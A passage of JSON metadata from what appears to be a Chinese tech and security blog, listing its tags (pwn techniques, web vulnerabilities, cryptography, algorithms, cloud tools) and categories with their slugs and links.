},{"name":"IAST","slug":"IAST","link":"/tags/IAST/"},{"name":"Joplin","slug":"Joplin","link":"/tags/Joplin/"},{"name":"编译原理","slug":"编译原理","link":"/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"name":"SSH","slug":"SSH","link":"/tags/SSH/"},{"name":"SOCKS5","slug":"SOCKS5","link":"/tags/SOCKS5/"},{"name":"nop-sled","slug":"nop-sled","link":"/tags/nop-sled/"},{"name":"jwt","slug":"jwt","link":"/tags/jwt/"},{"name":"小程序","slug":"小程序","link":"/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"面试","slug":"面试","link":"/tags/%E9%9D%A2%E8%AF%95/"},{"name":"OpenSSL","slug":"OpenSSL","link":"/tags/OpenSSL/"},{"name":"同态加密","slug":"同态加密","link":"/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"},{"name":"概率论","slug":"概率论","link":"/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Quasar","slug":"Quasar","link":"/tags/Quasar/"},{"name":"ret2csu","slug":"ret2csu","link":"/tags/ret2csu/"},{"name":"ARM","slug":"ARM","link":"/tags/ARM/"},{"name":"网络编程","slug":"网络编程","link":"/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"口令安全","slug":"口令安全","link":"/tags/%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8/"},{"name":"CBC字节翻转攻击","slug":"CBC字节翻转攻击","link":"/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"},{"name":"二次编码","slug":"二次编码","link":"/tags/%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81/"},{"name":"Bellman-Ford","slug":"Bellman-Ford","link":"/tags/Bellman-Ford/"},{"name":"spfa","slug":"spfa","link":"/tags/spfa/"},{"name":"伪协议","slug":"伪协议","link":"/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"变量覆盖","slug":"变量覆盖","link":"/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"条件竞争","slug":"条件竞争","link":"/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"},{"name":"struts2","slug":"struts2","link":"/tags/struts2/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"ThinkPHP","slug":"ThinkPHP","link":"/tags/ThinkPHP/"},{"name":"phpMyAdmin","slug":"phpMyAdmin","link":"/tags/phpMyAdmin/"},{"name":"线段树","slug":"线段树","link":"/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"},{"name":"计算几何","slug":"计算几何","link":"/tags/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/"},{"name":"APICloud","slug":"APICloud","link":"/tags/APICloud/"},{"name":"SSP","slug":"SSP","link":"/tags/SSP/"},{"name":"ret2shellcode","slug":"ret2shellcode","link":"/tags/ret2shellcode/"},{"name":"jQuery","slug":"jQuery","link":"/tags/jQuery/"},{"name":"腾讯","slug":"腾讯","link":"/tags/%E8%85%BE%E8%AE%AF/"},{"name":"OS","slug":"OS","link":"/tags/OS/"},{"name":"go","slug":"go","link":"/tags/go/"},{"name":"Serverless","slug":"Serverless","link":"/tags/Serverless/"},{"name":"Kubernetes","slug":"Kubernetes","link":"/tags/Kubernetes/"},{"name":"Service Mesh","slug":"Service-Mesh","link":"/tags/Service-Mesh/"},{"name":"GCP","slug":"GCP","link":"/tags/GCP/"}],"categories":[{"name":"安全","slug":"安全","link":"/categories/%E5%AE%89%E5%85%A8/"},{"name":"探索","slug":"探索","link":"/categories/%E6%8E%A2%E7%B4%A2/"},{"name":"编程语言","slug":"编程语言","link":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Pwn","slug":"安全/Pwn","link":"/categories/%E5%AE%89%E5%85%A8/Pwn/"},{"name":"密码学","slug":"安全/密码学","link":"/categories/%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"工具","slug":"安全/工具","link":"/categories/%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/"},{"name":"Web","slug":"安全/Web","link":"/categories/%E5%AE%89%E5%85%A8/Web/"},{"name":"OJ","slug":"OJ","link":"/categories/OJ/"},{"name":"比赛记录","slug":"安全/比赛记录","link":"/categories/%E5%AE%89%E5%85%A8/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"},{"name":"图论","slug":"OJ/图论","link":"/categories/OJ/%E5%9B%BE%E8%AE%BA/"},{"name":"数论","slug":"OJ/数论","link":"/categories/OJ/%E6%95%B0%E8%AE%BA/"},{"name":"动态规划","slug":"OJ/动态规划","link":"/categories/OJ/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"漏洞学习","slug":"安全/漏洞学习","link":"/categories/%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"}]}